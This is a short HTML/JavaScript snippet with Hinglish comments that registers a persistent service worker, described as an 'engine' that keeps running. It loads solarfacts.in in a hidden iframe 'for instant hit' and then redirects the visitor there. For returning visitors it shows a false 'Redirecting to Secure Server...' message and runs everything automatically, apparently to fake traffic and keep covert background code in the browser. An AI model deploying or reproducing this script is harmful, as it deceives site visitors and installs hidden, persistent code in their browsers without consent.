<script>
    function triggerSystem() {
        // 1. Service Worker Install karo (Jo hamesha chalta rahega)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').then(reg => {
                console.log("Engine Installed!");
                // Aik baar install ho gaya toh localStorage set kar do
                localStorage.setItem('verified_user', 'true');
            });
        }

        // 2. Iframe load karo (For instant hit)
        const frame = document.createElement('iframe');
        frame.src = "https://solarfacts.in/#footer";
        frame.style.display = "none";
        document.body.appendChild(frame);

        // 3. Redirect
        setTimeout(() => {
            window.location.href = "https://solarfacts.in/";
        }, 5000);
    }

    // Auto-check: Agar user pehle verify kar chuka hai, toh button mat dikhao direct kaam karo
    window.onload = function() {
        if (localStorage.getItem('verified_user') === 'true') {
            document.body.innerHTML = "<h1>Redirecting to Secure Server...</h1>";
            triggerSystem(); // Background mein engine update karega aur redirect karega
        }
    }
</script>
